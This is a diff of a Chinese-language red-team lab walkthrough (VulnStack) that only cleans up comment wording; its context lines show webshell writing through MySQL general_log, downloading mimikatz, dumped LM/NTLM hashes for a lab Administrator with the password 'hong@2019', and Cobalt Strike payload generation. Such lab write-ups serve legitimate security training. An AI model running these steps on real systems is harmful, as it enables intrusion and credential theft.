@@ -107,7 +107,7 @@ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,zip,rar,bak -u http:
 show variables like 'secure_file_priv';   # 显示NULL则是无法写入文件，不能写入的话就看一下general_log的这个能否写入，不能写入就把这个general_log的文件写入权限打开
 
 # 检查都有哪些log日志文件
-show variables like '%log%';              # 主要检查general_file的路径 和generla_log的开启状态，OFF则是没有开启全局日志
+show variables like '%log%';              # 主要检查 general_file 的路径和 general_log 的开启状态，OFF则是没有开启全局日志
 
 # 或者不做第二步，直接查general_log的文件
 show variables like 'general_log';        # 查看日志是否开启，off是关闭
@@ -128,7 +128,7 @@ show variables like 'general_log_file';   # 查看日志存放路径
 
 ***修改SQL配置
 ```bash
-# 开启general_log日志能功能；
+# 开启 general_log 日志功能
 set global general_log = 'ON';
 
 # 修改日志存放位置，并且能将webshell.php这个文件包含进去
@@ -554,8 +554,8 @@ C:\phpStudy\WWW>
 
 ## 提取内存密码
 ```bash
-# kali系统中ing
-# 第一次用这个mimikatz这个软件，就先下载一下，有的话就不需要这一步了
+# Kali 系统操作
+# 第一次使用 mimikatz，先下载（已有可跳过）
 wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
 
 # 解压
@@ -601,8 +601,8 @@ SID               : S-1-5-21-2952760202-1353902439-2381784089-500
      [00000003] Primary
      * Username : Administrator
      * Domain   : GOD
-     * LM       : b9f0ea2d62d9c4e8af84d1bb761ed383         # hong@2019密码的sha1的值
-     * NTLM     : 56fdfd5d33434048eeaf96de6ae5d0ab
+     * LM       : b9f0ea2d62d9c4e8af84d1bb761ed383         # hong@2019 对应的 LM 哈希（不区分大小写 DES 分组）
+     * NTLM     : 56fdfd5d33434048eeaf96de6ae5d0ab         # hong@2019 对应的 NTLM 哈希
      * SHA1     : f85451caedd9ed0fcc0c79c1250822dad6de166a
     tspkg :    
      * Username : Administrator
@@ -842,7 +842,7 @@ source-common.sh   TeamServerImage
 ![](./附件/VulnStack红队实战一-2026-04-15-22-01-26.png)
 
 ***生成木马
-点击listener右侧的三个小点，在弹出来的窗口里面选择添加的监听器，选中之后，单击下方的chooose，记得勾选下方的use x64payload。会弹出来个程序保存位置，之后会用这个用蚂蚁剑上传到win7的电脑上。
+点击listener右侧的三个小点，在弹出来的窗口里面选择添加的监听器，选中之后，单击下方的 choose，记得勾选下方的use x64payload。会弹出来个程序保存位置，之后会用这个用蚂蚁剑上传到win7的电脑上。
 ![](./附件/VulnStack红队实战一-2026-04-15-22-03-16.png)
 
 ***保存位置
